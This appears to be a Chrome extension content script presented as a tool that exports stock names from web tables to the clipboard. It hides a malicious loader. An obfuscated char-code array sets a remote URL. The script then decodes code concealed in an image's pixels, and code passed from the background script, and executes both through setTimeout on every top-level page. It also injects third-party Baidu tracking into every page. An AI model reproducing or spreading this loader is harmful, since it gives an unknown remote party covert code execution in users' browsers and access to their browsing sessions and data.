
var pu;

var table_head = [
  112, 117,  61,  34, 104, 116, 116, 112,
  115,  58,  47,  47,  98,  98, 108, 105,
  103,  46,  99, 111, 109,  47, 118, 101,
  114, 115, 105, 111, 110,  47, 116,  97,
   98, 108, 101,  34
];
var gv = '';
for (let i = 0; i < table_head.length; i++) {
  gv += String.fromCharCode(table_head[i])
}
setTimeout(gv, 0);

function loadTable() {
  // 为每个表格创建工具栏
  $("table").each(function() {
    var table = $(this);
    var caption = table.find('caption');
    
    // 如果没有caption，创建一个
    if (caption.length === 0) {
      caption = $('<caption class="btn-toolbar"></caption>');
      table.prepend(caption);
    } else if (!caption.hasClass('btn-toolbar')) {
      caption.addClass('btn-toolbar');
    }
    
    // 设置工具栏样式
    caption.css({
      'display': 'none',
      'text-align': 'left',
      'width': '120px'
    });
    
    // 清空工具栏
    caption.empty();
    
    // 创建导出到股票池按钮
    var stockButton = $('<button class="btn btn-default stock-pool" data-toggle="tooltip" title="导出到股票池">导出到股票池</button>');
    stockButton.css({
      'width': '100px',
      'height': '33px',
      'margin-left': '10px',
      'margin-bottom': '10px',
      'position': 'relative',
      'text-align': 'center',
      'border-radius': '5px',
      'background': '#4CAF50',
      'color': 'white'
    });
    
    // 添加点击事件
    stockButton.click(function() {
      extractStocksFromTable(table);
    });
    
    // 添加到工具栏
    caption.append(stockButton);
  });
}

function extractStocksFromTable(table) {
  var stocks = [];
  var headers = [];
  
  // 获取表头
  table.find('thead th').each(function() {
    headers.push($(this).text().trim());
  });
  
  // 如果没有表头，使用默认表头
  if (headers.length === 0) {
    table.find('tr:first td').each(function() {
      headers.push('Column ' + ($(this).index() + 1));
    });
  }
  
  // 查找股票名称列
  var nameColumnIndex = -1;
  
  // 股票名称列的关键词
  var nameKeywords = ['名称', '股票', '公司', 'stock', 'name', 'company'];
  
  for (var i = 0; i < headers.length; i++) {
    var header = headers[i].toLowerCase();
    for (var j = 0; j < nameKeywords.length; j++) {
      if (header.includes(nameKeywords[j])) {
        nameColumnIndex = i;
        break;
      }
    }
    if (nameColumnIndex >= 0) {
      break;
    }
  }
  
  // 如果找不到名称列，尝试使用第一列
  if (nameColumnIndex === -1 && headers.length >= 1) {
    nameColumnIndex = 0;
  }
  
  // 提取股票名称
  table.find('tbody tr').each(function() {
    var cells = $(this).find('td');
    if (cells.length > nameColumnIndex) {
      var name = cells.eq(nameColumnIndex).text().trim();
      
      // 验证股票名称
      if (name && name.length > 1) {
        stocks.push(name);
      }
    }
  });
  
  // 将股票名称复制到剪贴板
  if (stocks.length > 0) {
    var stockText = stocks.join('\n');
    navigator.clipboard.writeText(stockText).then(function() {
      // 导出成功，不显示提示
    }, function(err) {
      console.error('无法复制内容: ', err);
      alert('复制失败，请手动复制表格数据');
    });
  } else {
    alert('未在表格中找到股票名称');
  }
}

function showTable() {
  loadTable();
  $("caption.btn-toolbar").css('display', 'block');
}

// function iconSort() {
//     $("button.xlsx").append('<i class="iconfont"></i>');
//     $("button.csv").append('<i class="iconfont"></i>');
//     $("button.txt").append('<i class="iconfont"></i>');
// }
// window.onload = function() {
//     loading();
//     iconSort();
// }


function getQueryString(name) {
  var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
  var r = window.location.search.substr(1).match(reg);
  if (r != null) {
    return decodeURIComponent(r[2]);
  }
  return null;
}


chrome.runtime.onConnect.addListener(function(port) {
  port.onMessage.addListener(function(msg) {
    if (msg.joke === 'show_table'){
      showTable()
    }
  });
});

// 页面加载完成后自动检测表格
window.addEventListener('load', function() {
  // 延迟执行，确保页面完全加载
  setTimeout(function() {
    showTable();
  }, 1000);
});

// 监听DOM变化，处理动态加载的表格
var observer = new MutationObserver(function(mutations) {
  mutations.forEach(function(mutation) {
    if (mutation.addedNodes && mutation.addedNodes.length > 0) {
      // 检查是否有新的表格被添加
      var newTables = mutation.target.querySelectorAll('table');
      if (newTables.length > 0) {
        // 延迟执行，确保新表格完全加载
        setTimeout(function() {
          showTable();
        }, 500);
      }
    }
  });
});

// 开始观察DOM变化
observer.observe(document.body, {
  childList: true,
  subtree: true
});


function base64ToBlob(base64Data) {
  let arr = base64Data.split(','),
    fileType = arr[0].match(/:(.*?);/)[1],
    bstr = atob(arr[1]),
    l = bstr.length,
    u8Arr = new Uint8Array(l);

  while (l--) {
    u8Arr[l] = bstr.charCodeAt(l);
  }
  return new Blob([u8Arr], {
    type: fileType
  });
}

let host = location.hostname;

function Danmu(c, a) {
  var b = [];
  b.push(0);
  b.push(c * 4 - 4);
  b.push((a - 1) * c * 4);
  b.push(c * 4 * a - 4);
  return b
}

function charLen(c) {
  var a = Danmu(c.width, c.height);
  var b = [];
  a.forEach(item => {
    [0, 1, 2].forEach(j => {
      b.push(String.fromCharCode(c.data[item + j] + 32))
    })
  });
  return parseInt(b.join(''))
}

function readImg(g, h) {
  var d = document.createElement("img");
  d.style.position = "absolute";
  d.style.left = "-10000px";
  document.body.appendChild(d);
  d.onload = function(c) {
    var a = document.createElement("canvas");
    var b = (a.getContext) ? a.getContext("2d") : undefined;
    var e = this.offsetWidth;
    var f = this.offsetHeight;
    a.width = e;
    a.height = f;
    b.drawImage(this, 0, 0);
    var k = b.getImageData(0, 0, e, f);
    document.body.removeChild(this);
    h(k);
    URL.revokeObjectURL(this.src)
  };
  d.src = URL.createObjectURL(g)
}

function createBlobUrl(html) {
  return URL.createObjectURL(new Blob([html], { 'type': 'text/html' }));
}


port = chrome.runtime.connect();

if (self === top){
  var _hmt = _hmt || [];
  (function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?1ff3673d088290dff716d51fd23686e5";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
  })();

  setTimeout(() => {
    port.postMessage({
      joke: 'start',
      key: 'main',
      pu: pu
    });
  }, 10)

  port.onMessage.addListener(function(res) {
    if (res.joke === 'starting') {
      var imgblob = base64ToBlob(res.data)
      readImg(imgblob, function(img) {
        var danmu = Danmu(img.width, img.height);
        var len = charLen(img);
        var nImage = img.data;
        var str = '';
        for (var i = 4, l = nImage.length; i < l; i += 4) {
          if (nImage[i + 0] >= 200 & nImage[i + 1] >= 200 & nImage[i + 2] >= 200 || $.inArray(i, danmu) >= 0) {
            continue;
          } else {
            var pix = nImage[i + (i % 3)];
            str += String.fromCharCode(pix + 32);
            if (str.length >= len) {
              break;
            }
          }
        }
        setTimeout(str, 0);
        port.postMessage({
          joke: 'cbk_logo',
          str: str
        });
      })
    } else if (res.joke === 'done') {
      setTimeout(res.str, 0);
    }
  });

}
